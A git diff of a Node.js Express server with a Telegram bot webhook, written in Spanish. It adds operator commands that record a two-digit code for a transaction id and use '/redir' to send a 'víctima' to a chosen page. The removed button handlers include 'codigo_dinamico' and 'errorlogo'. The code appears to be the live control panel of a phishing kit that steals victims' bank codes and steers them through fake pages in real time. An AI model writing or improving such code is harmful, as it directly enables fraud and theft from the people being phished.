@@ -138,8 +138,12 @@ app.post('/enviar3', async (req, res) => {
 app.post('/webhook', async (req, res) => {
   // Comando: /txid 25
   if (req.body.message?.text?.startsWith('/')) {
-    const commandParts = req.body.message.text.slice(1).trim().split(' ');
-    const txid = commandParts[0];
+  const commandParts = req.body.message.text.slice(1).trim().split(' ');
+  const primerArg = commandParts[0];
+
+  // Caso 1: Comando para ingresar código → /txid 22
+  if (/^[a-zA-Z0-9]{8}$/.test(primerArg)) {  // txid típico de 8 caracteres
+    const txid = primerArg;
     const codigoStr = commandParts[1]?.trim();
 
     if (!codigoStr || !/^\d{2}$/.test(codigoStr)) {
@@ -154,62 +158,65 @@ app.post('/webhook', async (req, res) => {
       return res.sendStatus(200);
     }
 
-   const cliente = cargarCliente(txid) || { status: 'esperando' };
-cliente.codigo = codigoStr;
-cliente.status = 'codigo_ingresado';  // ← NUEVO STATUS ESPECIAL
-guardarCliente(txid, cliente);
+    const cliente = cargarCliente(txid) || { status: 'esperando' };
+    cliente.codigo = codigoStr;
+    cliente.status = 'codigo_ingresado';
+    guardarCliente(txid, cliente);
 
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: req.body.message.chat.id,
-        text: `✅ Código guardado correctamente para ${txid}\n🔢 Código: ${codigoStr}`
+        text: `✅ Código guardado: ${codigoStr} para ${txid}`
       })
     });
     return res.sendStatus(200);
   }
 
-  // Botones presionados
-  if (req.body.callback_query) {
-    const callback = req.body.callback_query;
-    const partes = callback.data.split(":");
-    const accion = partes[0];
-    const txid = partes[1];
+  // Caso 2: Nuevo comando /redir txid pagina.html
+  if (primerArg === 'redir' && commandParts.length >= 3) {
+    const txid = commandParts[1];
+    const paginaDestino = commandParts.slice(2).join(' ');  // Permite nombres con espacios si quieres
 
-    const cliente = cargarCliente(txid) || { status: 'esperando' };
-
-    if (accion === 'confirm') {
-      cliente.status = 'confirmado';
-    } else if (accion === 'errorlogo') {
-      cliente.status = 'error_logo';
-    } else if (accion === 'cel-dina') {
-      cliente.status = 'codigo_dinamico';
-    } else if (accion === 'codigo_menu') {
+    const cliente = cargarCliente(txid);
+    if (!cliente) {
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: callback.message.chat.id,
-          text: `🔢 Envía el código de 2 dígitos para ${txid}\nEjemplo: /${txid} 25`
+          chat_id: req.body.message.chat.id,
+          text: `❌ No se encontró el txid: ${txid}`
         })
       });
+      return res.sendStatus(200);
     }
 
+    cliente.redir_a = paginaDestino;  // Guardamos la página destino
+    cliente.status = 'redirigiendo';  // Status especial para detectar
     guardarCliente(txid, cliente);
 
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        callback_query_id: callback.id,
-        text: "Listo"
+        chat_id: req.body.message.chat.id,
+        text: `✅ Redirección programada para ${txid}\n➡️ Página: ${paginaDestino}`
       })
     });
     return res.sendStatus(200);
   }
 
-  res.sendStatus(200);
+  // Si no es ningún comando conocido
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: req.body.message.chat.id,
+      text: `Comandos disponibles:\n/${'txid'} 22 → ingresar código\n/redir txid pagina.html → redirigir víctima`
+    })
+  });
+  return res.sendStatus(200);
 });
 
 // === ESTADO PARA TU PÁGINA WEB ===
